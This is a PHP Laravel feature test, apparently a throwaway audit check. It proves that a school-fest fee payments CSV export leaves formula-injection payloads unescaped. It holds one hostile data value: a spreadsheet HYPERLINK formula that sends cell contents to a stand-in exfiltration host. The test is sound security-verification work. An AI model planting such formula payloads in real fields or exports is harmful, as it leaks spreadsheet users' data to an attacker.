<?php

namespace Tests\Feature\Events;

use App\Models\FeeReceipt;
use App\Models\FestEvent;
use App\Models\FestSchoolEventFee;
use App\Models\SahodayaProfile;
use App\Models\Tenant;
use App\Models\User;
use Database\Seeders\RolesAndPermissionsSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Str;
use Tests\TestCase;

/**
 * SCRATCH / THROWAWAY — security audit verification only. Proves CWE-1236 (CSV formula
 * injection) in FestEventFeesController::exportPayments by round-tripping a malicious
 * transaction_ref through the real HTTP export endpoint and inspecting the raw bytes.
 * Delete after the audit run.
 */
class ScratchFormulaInjectionAuditTest extends TestCase
{
    use RefreshDatabase;

    public function test_transaction_ref_formula_payload_is_not_escaped_in_csv_export(): void
    {
        $this->seed(RolesAndPermissionsSeeder::class);

        $sahodaya = Tenant::create([
            'id' => (string) Str::uuid(),
            'type' => 'sahodaya',
            'name' => 'Formula Injection Audit Sahodaya',
            'domain' => 'formula-injection-audit.test',
            'is_active' => true,
        ]);
        SahodayaProfile::create([
            'tenant_id' => $sahodaya->id,
            'prefix' => 'FI',
            'student_data_mode' => 'counts_only',
        ]);
        $school = Tenant::create([
            'id' => (string) Str::uuid(),
            'type' => 'school',
            'name' => 'Formula Injection Audit School',
            'parent_id' => $sahodaya->id,
            'membership_status' => 'approved',
            'is_active' => true,
        ]);
        $admin = User::factory()->create(['tenant_id' => $sahodaya->id, 'email_verified_at' => now()]);
        $admin->assignRole('sahodaya_admin');

        $event = FestEvent::create([
            'tenant_id' => $sahodaya->id,
            'title' => 'Formula Injection Audit Event',
            'event_type' => 'kalolsavam',
            'level_round' => 'sahodaya',
            'status' => 'published',
        ]);

        // The realistic attacker: a school-admin typing a "bank transaction reference"
        // into a plain <input>, validated only as 'required|string|max:100' (see
        // app/Http/Controllers/SchoolAdmin/FestRegistrationController.php:1093). No
        // character restriction — a formula/DDE payload passes validation untouched.
        $payload = '=HYPERLINK("https://evil.example/exfil?x="&A1,"Click for receipt")';

        $receipt = FeeReceipt::create([
            'feeable_type' => FestSchoolEventFee::class,
            'feeable_id' => 0,
            'file_path' => 'fest/receipts/dummy.jpg',
            'transaction_ref' => $payload,
            'amount' => 100,
            'status' => 'approved',
        ]);

        FestSchoolEventFee::create([
            'event_id' => $event->id,
            'school_id' => $school->id,
            'participation_item_count' => 1,
            'total_due' => 100,
            'fee_receipt_id' => $receipt->id,
            'status' => 'approved',
        ]);

        $response = $this->actingAs($admin)->get(route('sahodaya.events.fees.export', [
            'tenantId' => $sahodaya->id,
            'event' => $event->id,
        ]));

        $response->assertOk();

        $csv = $response->streamedContent();

        fwrite(STDERR, "\n----- RAW CSV BYTES (first 600 chars) -----\n");
        fwrite(STDERR, substr($csv, 0, 600)."\n");
        fwrite(STDERR, "----- END RAW CSV BYTES -----\n");

        $this->assertStringContainsString(
            $payload,
            $csv,
            'Expected the raw, unescaped formula payload to appear verbatim in the CSV (confirming no sanitization is applied).'
        );

        // A CSV-formula-injection-safe implementation would neutralize a leading =/+/-/@,
        // typically by prefixing the cell with a plain quote or a tab before the sign. If
        // that were happening, the raw payload would NOT appear immediately after a comma
        // the way it does here.
        $this->assertStringContainsString(
            ','.$payload,
            $csv,
            'Cell value follows a CSV delimiter with no neutralizing prefix (no leading \', tab, etc.) — Excel/Sheets will parse it as a live formula on open.'
        );
    }
}
